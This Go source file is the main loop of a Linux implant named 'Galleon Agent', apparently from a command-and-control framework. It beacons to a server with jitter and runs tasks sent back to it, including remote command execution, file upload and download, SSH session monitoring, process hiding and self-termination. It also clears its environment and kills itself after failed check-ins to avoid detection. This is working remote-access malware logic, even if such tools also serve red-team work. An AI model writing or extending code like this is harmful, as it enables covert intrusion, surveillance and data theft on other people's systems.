//go:build linux

package main

import (
	"encoding/json"
	"fmt"
	"galleon/agent_config"
	"galleon/agent_helper"
	"galleon/debug"
	"os"
	"time"
)

func ParseTasks(tasking string) (string, error) {

	var tasks []map[string]interface{}
	err := json.Unmarshal([]byte(tasking), &tasks)
	if err != nil {
		return "", err
	}

	for _, taskData := range tasks {
		url := fmt.Sprintf("%s/results/%s", agent_config.ServerUrl, taskData["session"])
		TaskHandler(taskData, url)
	}
	return "", nil
}

func TaskHandler(taskData map[string]interface{}, url string) {
	if debug.Debug {
		fmt.Printf("[*] Task Recv: %s\n", taskData["task"])
	}
	switch taskData["task"] {
	case "ls":
		agent_helper.LsHandler(url, taskData)
	case "ps":
		agent_helper.PsHandler(url, taskData)
	case "ssh_monitor":
		agent_helper.SSHMonitorHandler(url, taskData)
	case "exec_bg":
		agent_helper.ExecBgHandler(url, taskData)
	case "exec_fg":
		agent_helper.ExecFgHandler(url, taskData)
	case "reconfig":
		agent_helper.ReconfigHandler(url, taskData)
	case "kill":
		agent_helper.SendDeathMessage(agent_config.ServerUrl, taskData["session"].(string))
		agent_helper.DataShipper(url, taskData, "true")
		agent_helper.TerminateImplant()
	case "download":
		agent_helper.DownloadHandler(url, taskData)
	case "upload":
		agent_helper.UploadHandler(url, taskData)
	case "pid_hider":
		agent_helper.PidHiderHandler(url, taskData)
	default:
		agent_helper.DataShipper(url, taskData, "unknown task")
	}
}

func main() {

	os.Clearenv()

	if agent_config.AgentId == "" || agent_config.AgentSecret == "" || agent_config.ServerCertSHA256 == "" {
		if debug.Debug {
			fmt.Println("[!] AgentId, AgentSecret, or ServerCertSHA256 not set")
		}
		os.Exit(1)
	}

	retryCounter := 0
	if debug.Debug {
		fmt.Println("[*] Starting Galleon Agent")
		fmt.Println("[*] Debug mode enabled")
		fmt.Printf("retryCounter %v\n", retryCounter)
	}
	initialInfo := agent_helper.GatherInfo()
	time.Sleep(time.Duration(agent_helper.CallbackTimer.StartDelay) * time.Second)
	agent_helper.InitialCheckin(agent_config.ServerUrl, initialInfo)
	agent_helper.SigHandler(agent_config.ServerUrl, initialInfo.Session)

	for {
		nextInterval := agent_helper.RandomJitter(agent_helper.CallbackTimer.Callback_freq, agent_helper.CallbackTimer.Jitter)
		timer := time.NewTimer(nextInterval)

		<-timer.C
		resp, err := agent_helper.CheckIn(agent_config.ServerUrl, initialInfo.Session)
		if err != nil {
			retryCounter += 1
			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
				agent_helper.TerminateImplant()
			}
			continue
		}
		if resp != 200 && resp != 301 {
			retryCounter += 1
			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
				agent_helper.TerminateImplant()
			}
			continue
		}
		if resp == 301 {
			// we have tasking
			tasking, err := agent_helper.FetchTasking(agent_config.ServerUrl, initialInfo.Session)
			if err != nil {
			} else {
				ParseTasks(tasking)
			}
			continue
		}
		retryCounter = 0
		timer.Stop()
	}
}
